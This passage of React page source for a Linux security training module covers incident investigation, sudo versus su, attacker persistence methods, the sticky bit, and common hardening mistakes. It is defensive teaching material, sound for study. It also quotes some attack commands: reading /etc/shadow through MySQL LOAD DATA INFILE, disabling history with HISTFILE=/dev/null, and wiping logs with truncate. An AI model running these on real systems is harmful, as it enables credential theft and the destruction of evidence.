        {'\n\n'}
        Step three: check persistence mechanisms. Crontab for all users: crontab -l run as each user. System cron: /etc/crontab and /etc/cron.d/. SSH authorized_keys for all users: check for keys that were not supposed to be there. New accounts in /etc/passwd. New SUID binaries: find / -perm -4000 -type f.
        {'\n\n'}
        Step four: find recently modified files. find / -mtime -7 -type f lists everything modified in the last week. Files in /tmp, /var/tmp, /dev/shm, and disguised inside log directories are common places attackers stage tools.
        {'\n\n'}
        Step five: examine bash history for all users, especially root. .bash_history shows commands run during a compromise — reconnaissance commands like id and whoami, files downloaded with wget or curl, and exfiltration commands.
        {'\n\n'}
        Throughout: assume the system is compromised and that anything on it could be tampered with, including the tools themselves. If a rootkit is present, system binaries like ps, ls, and netstat may be replaced to hide attacker activity. Run investigation tools from a trusted external source when possible.
      </IQ>

      <IQ q="What is the difference between su and sudo? Which is safer and why?">
        su (substitute user) switches the current session to a different user account. su root prompts for the root password and, if correct, drops you into a root shell for the duration of the session. Any command you run in that shell has root privileges.
        {'\n\n'}
        sudo (superuser do) runs a specific command with elevated privileges, then returns to the original user context. sudo service nginx restart runs only that one command as root. sudo requires the calling user's own password (not root's), and every invocation is logged to /var/log/auth.log with the exact command, the user who ran it, and when.
        {'\n\n'}
        sudo is safer for several reasons. First, the root password does not need to be shared — each operator uses their own credentials, enabling attribution when something goes wrong. Second, audit logging records exactly which privileged commands each user ran. Third, sudo can be scoped: /etc/sudoers can grant specific users permission to run only specific commands as root, rather than full root access. An operator who only needs to restart nginx can be granted exactly that, not arbitrary root access. Fourth, using sudo for specific operations reduces the window of elevated privilege — the session is not a persistent root shell that can be left running.
        {'\n\n'}
        The worst sudo configuration is NOPASSWD: ALL for any user — this grants unconditional root access without even requiring a password, providing none of sudo's intended benefits. Security audits always check sudoers for overly permissive entries.
      </IQ>

      <IQ q="An attacker has root access on a Linux server. What persistence mechanisms would they use, and how would you detect each?">
        With root access, an attacker has unlimited options for persistence — the ability to survive reboots, account password changes, and incident response attempts.
        {'\n\n'}
        SSH key backdoor: adding an attacker-controlled public key to /root/.ssh/authorized_keys provides persistent SSH access as root regardless of what the root password is changed to. Detection: monitor /root/.ssh/authorized_keys for modifications; compare against a baseline; alert on any new lines.
        {'\n\n'}
        Cron job: adding a crontab entry that downloads and executes a payload, or restarts a malicious process if it is killed. Detection: monitor /var/spool/cron/crontabs/, /etc/crontab, and /etc/cron.d/ for changes; file integrity monitoring with alerts on any modification.
        {'\n\n'}
        Malicious systemd service: creating a systemd service unit file that starts malicious code on boot. Detection: monitor /etc/systemd/system/ for new files; compare systemctl list-units against a baseline.
        {'\n\n'}
        SUID backdoor: copying bash to a hidden location and setting SUID root on it — anyone who finds and runs this hidden binary gets a root shell. Detection: regular SUID binary audits with find / -perm -4000; any binary not in the known baseline is suspicious.
        {'\n\n'}
        Kernel rootkit: loading a malicious kernel module that hides processes, files, and network connections from standard tools. This is the most sophisticated persistence — the tools you use to investigate (ps, ls, netstat) are themselves modified to lie. Detection: compare lsmod output against a baseline; use external integrity monitoring tools that operate below the OS layer; look for system call hooking with specialised tools.
        {'\n\n'}
        Web shell: for web servers, a web shell (a PHP file that accepts and executes OS commands via HTTP requests) provides persistent access through the web server. Detection: file integrity monitoring on the web root; monitoring for unexpected POST requests with abnormal response sizes; SIEM rules for web shell indicators in web logs.
      </IQ>

      <IQ q="What does the sticky bit do on a directory, and why does /tmp have it set?">
        The sticky bit, when set on a directory, restricts deletion and renaming of files within that directory. Normally, a user who has write permission on a directory can delete or rename any file in it, regardless of who owns the file. The sticky bit changes this: only the file's owner, the directory's owner, or root can delete or rename a file. Users with write permission on the sticky directory can add new files and modify files they own, but cannot delete or rename files owned by other users.
        {'\n\n'}
        /tmp has the sticky bit set (mode 1777 — the leading 1 is the sticky bit) because /tmp is world-writable — all users and processes need to be able to create temporary files there. Without the sticky bit, any user with access to the system could delete temporary files owned by any other user, enabling denial-of-service attacks against applications that depend on their temporary files persisting during a session.
        {'\n\n'}
        The sticky bit is shown with a t at the end of the directory permissions: drwxrwxrwt for /tmp. If the execute bit were not also set, it appears as T (capital T) instead.
        {'\n\n'}
        Security implication: despite the sticky bit, /tmp is still a common location for attackers to stage tools because it is world-writable — anyone can create files there. The sticky bit prevents users from deleting each other's files but does not prevent creating new files. Mounting /tmp with the noexec option prevents execution of files in /tmp, which is a meaningful defence: even if an attacker writes a binary to /tmp, they cannot execute it directly.
      </IQ>

      <HR />

      {/* ── Error Library ── */}
      <Part n="11" title="Linux Security Mistakes That Get Systems Compromised" />

      <Err
        msg="Permission denied: /etc/shadow — but the attacker still got the hashes"
        cause="A SQL injection vulnerability in a PHP web application running as www-data gave the attacker a database shell. The database was running as root. From the root MySQL session, the attacker ran LOAD DATA INFILE '/etc/shadow' INTO TABLE attacker_table — reading a file that www-data could not directly access, but MySQL running as root could. The file permissions on /etc/shadow were correct; the problem was MySQL running as root rather than as a dedicated mysql user."
        fix="Run every service as a dedicated non-root user with the minimum permissions it needs. MySQL does not need to run as root — the mysql system user with access only to the database files is sufficient. Apply least privilege at the service level: if a service does not need to read /etc/shadow, it should not be able to. Combine with SELinux or AppArmor mandatory access controls that enforce additional restrictions beyond file permissions."
      />

      <Err
        msg="History file shows nothing — the attacker cleaned up"
        cause="The attacker started their session with HISTFILE=/dev/null to disable command history, then cleared /var/log/auth.log and /var/log/syslog using truncate -s 0. The logs appear empty, and bash_history contains nothing. This is common attacker operational security. If logs were only stored locally, the evidence is destroyed."
        fix="Centralise logs to a remote syslog server or SIEM before you need them. Forward auth.log, syslog, and application logs via rsyslog or filebeat to a write-once, append-only log storage that the compromised server cannot access. Even if the attacker destroys local logs, the remote copy preserves the evidence. Auditd provides kernel-level audit logging that captures commands even when bash history is disabled — configure it on all servers handling sensitive data."
      />

      <Err
        msg="PasswordAuthentication was disabled in sshd_config — but the attacker still logged in with a password"
        cause="The server had two sshd_config files: /etc/ssh/sshd_config (the main one with PasswordAuthentication no) and /etc/ssh/sshd_config.d/override.conf (a drop-in file added during an automated deployment that re-enabled password authentication). The include directive in sshd_config reads all files in sshd_config.d/ and later settings override earlier ones. The override file won, enabling password auth."
        fix="After any sshd configuration change, verify the effective configuration with sshd -T | grep passwordauthentication — this shows the actual running configuration, not just what a single file says. Do not assume a setting in sshd_config is effective without verifying via sshd -T. This pattern applies to any configuration system with include files or override directories."
      />

      <Err
        msg="chmod 777 /var/www/html/ fixed the permission denied error for the web server"
        cause="A developer applied world-readable, world-writable, world-executable permissions to the entire web root to fix a mysterious permission error during deployment. Now any user or process on the system can create, modify, or delete files in the web root. A low-privilege process that achieves code execution on the server (via a vulnerability in an unrelated service) can now create PHP files in the web root — deploying a web shell without ever touching file system permissions."
        fix="Identify the actual permission problem rather than opening everything. Web server files should be owned by root or a deployment user, with the web server user (www-data) having read-only access. The web server process should not have write access to the web root — if it needs to write, use a separate directory outside the web root for uploads, and never execute files from upload directories. 755 for directories, 644 for files, with nginx/apache read access via group membership."
      />

      <Err
        msg="The application stopped working after the security team removed the cron job — that was our backup script"
        cause="A cron job running as root had been added by a developer to handle automated backups. No one else knew it existed. When the security team found an unfamiliar cron entry during an audit (which looked suspicious), they removed it as a potential attacker persistence mechanism. The backup stopped running for three weeks before anyone noticed. The security team was doing the right thing — they should have investigated first."
        fix="Document all cron jobs, systemd timers, and scheduled tasks in version control or a configuration management system. Any scheduled task that is not documented should be treated as suspicious — but investigated before removal. Before removing a cron entry during incident response, capture the full content, check who created it (last modification time, git blame in configuration repositories), and notify the team. The correct workflow is: identify → document → verify legitimacy → remove if malicious."
      />

      {/* ── Key Takeaways ── */}
      <KeyTakeaways items={[
        'Linux runs 96% of top web servers and all major cloud default instances — security engineers who cannot navigate a Linux terminal are limited to GUI tools, which excludes most professional security work.',
        'The filesystem layout is a security map. /etc holds configuration (attacker target for persistence). /var/log holds evidence (attackers clear these). /tmp is world-writable (attacker staging). /proc holds running process information (forensics goldmine). Know each directory\'s security significance.',
        'File permissions use three categories (owner, group, others) and three bits (read, write, execute). SUID binaries run with the file owner\'s permissions — if owner is root and the binary is vulnerable, it is a privilege escalation path. Find them with find / -perm -4000.',
        'Root (UID 0) has no restrictions. Services should run as dedicated non-root users with minimum permissions. sudo is safer than su because it is scoped, audited, and does not require sharing the root password. Every sudo invocation is logged.',
        'Log investigation sequence for a suspected Linux compromise: auth.log (authentication events), bash_history (attacker commands), crontab for all users (persistence), /root/.ssh/authorized_keys (SSH backdoor), find with recent mtime (new files), ss -tnp (unexpected network connections).',
        'SSH key authentication eliminates brute force attacks. Disable PasswordAuthentication, disable PermitRootLogin, restrict AllowUsers. Verify the effective configuration with sshd -T, not just by reading the config file. Monitor authorized_keys files for additions.',
        'Attackers delete or truncate log files to destroy evidence. Centralise logs to a remote SIEM immediately — before an incident happens. A SIEM copy of auth.log preserves authentication evidence even if the attacker runs truncate -s 0 on the local copy.',
        'Process forensics uses /proc/[pid]/exe to find what binary a process runs (even if the file was deleted from disk), /proc/[pid]/fd for open files, and /proc/[pid]/environ for environment variables. A process with "(deleted)" in its exe path is a strong indicator of compromise.',
        'SSH tunneling creates encrypted channels that bypass firewall rules. Remote port forwarding (ssh -R) is a favourite attacker technique for creating persistent access from the outside in. Monitor for SSH connections that initiate outbound rather than accepting inbound.',
        'Linux privilege escalation follows a checklist: SUID binaries, sudo -l output, writable cron jobs, writable systemd service files, misconfigured PATH, world-writable files owned by root, and kernel version vulnerabilities. Understanding the checklist as a defender tells you exactly what to lock down.',
      ]} />

      {/* ── Next Module CTA ── */}
      <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 10, padding: '24px', marginTop: 40 }}>
        <p style={{ fontSize: 10, color: 'var(--muted)', letterSpacing: '.12em', textTransform: 'uppercase', fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 10px' }}>
          What comes next
        </p>
        <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.85, margin: '0 0 20px' }}>
          In <strong>Module 04</strong>, you go inside the math that protects everything — cryptography. How AES actually works, why RSA is hard to break, what a digital signature proves, and which algorithms are broken in practice. Security engineers who understand crypto make better design decisions than those who treat it as a black box.
        </p>
        <Link href="/learn/cybersecurity/cryptography-fundamentals" style={{ background: C, color: '#fff', padding: '11px 24px', borderRadius: 7, fontWeight: 700, fontSize: 13, textDecoration: 'none', display: 'inline-block' }}>
          Module 04 → Cryptography From Scratch
        </Link>
      </div>

    </LearnLayout>
  )
}
